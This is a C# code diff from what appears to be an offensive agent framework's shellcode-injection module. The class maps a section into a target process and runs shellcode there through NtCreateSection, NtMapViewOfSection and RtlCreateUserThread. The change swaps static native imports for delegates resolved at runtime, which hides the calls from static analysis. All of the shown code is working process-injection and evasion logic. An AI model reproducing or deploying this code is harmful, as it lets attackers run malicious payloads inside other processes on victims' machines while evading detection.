@@ -6,11 +6,15 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using Athena.Commands;
 
 namespace shellcode_inject.Techniques
 {
     public class MVS : ITechnique
     {
+        DynamicHandler.DynamicNtCretSection dlgNtCrtSctn = (DynamicHandler.DynamicNtCretSection)DynamicHandler.findDeleg("ntdll.dll", DynamicHandler.NtCrtSect, typeof(DynamicHandler.DynamicNtCretSection));
+        DynamicHandler.DynamicNtMapViewSect dlgMapViewSect = (DynamicHandler.DynamicNtMapViewSect)DynamicHandler.findDeleg("ntdll.dll", DynamicHandler.NtMapViewSect, typeof(DynamicHandler.DynamicNtMapViewSect));
+        DynamicHandler.DynamicRtlCrtUsrThread dlgRtlCrtUsrThrd = (DynamicHandler.DynamicRtlCrtUsrThread)DynamicHandler.findDeleg("ntdll.dll", DynamicHandler.RtlCrtUsrThrd, typeof(DynamicHandler.DynamicRtlCrtUsrThread));
         public bool Inject(byte[] shellcode, IntPtr hTarget)
         {
             IntPtr hSectionHandle = IntPtr.Zero;
@@ -18,7 +22,7 @@ namespace shellcode_inject.Techniques
             UInt64 size = (UInt32)shellcode.Length;
 
             // create a new section to map view to
-            UInt32 result = Native.NtCreateSection(ref hSectionHandle, Native.SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, ref size, Native.MemoryProtection.PAGE_EXECUTE_READWRITE, Native.MappingAttributes.SEC_COMMIT, IntPtr.Zero);
+            UInt32 result = dlgNtCrtSctn(ref hSectionHandle, DynamicHandler.SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, ref size, DynamicHandler.MemoryProtection.PAGE_EXECUTE_READWRITE, DynamicHandler.MappingAttributes.SEC_COMMIT, IntPtr.Zero);
 
             if (result != 0)
             {
@@ -27,7 +31,7 @@ namespace shellcode_inject.Techniques
             // create a local view
             const UInt32 ViewUnmap = 0x2;
             UInt64 offset = 0;
-            result = Native.NtMapViewOfSection(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, Native.MemoryProtection.PAGE_READWRITE);
+            result = dlgMapViewSect(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, DynamicHandler.MemoryProtection.PAGE_READWRITE);
 
             if (result != 0)
             {
@@ -38,11 +42,11 @@ namespace shellcode_inject.Techniques
             Marshal.Copy(shellcode, 0, pLocalView, shellcode.Length);
             // create a remote view of the section in the target
             IntPtr pRemoteView = IntPtr.Zero;
-            Native.NtMapViewOfSection(hSectionHandle, hTarget, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, Native.MemoryProtection.PAGE_EXECUTE_READ);
+            dlgMapViewSect(hSectionHandle, hTarget, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, DynamicHandler.MemoryProtection.PAGE_EXECUTE_READ);
             // execute the shellcode
             IntPtr hThread = IntPtr.Zero;
-            Native.CLIENT_ID cid = new Native.CLIENT_ID();
-            Native.RtlCreateUserThread(hTarget, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);
+            DynamicHandler.CLIENT_ID cid = new DynamicHandler.CLIENT_ID();
+            dlgRtlCrtUsrThrd(hTarget, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);
 
             if (hThread == IntPtr.Zero)
             {
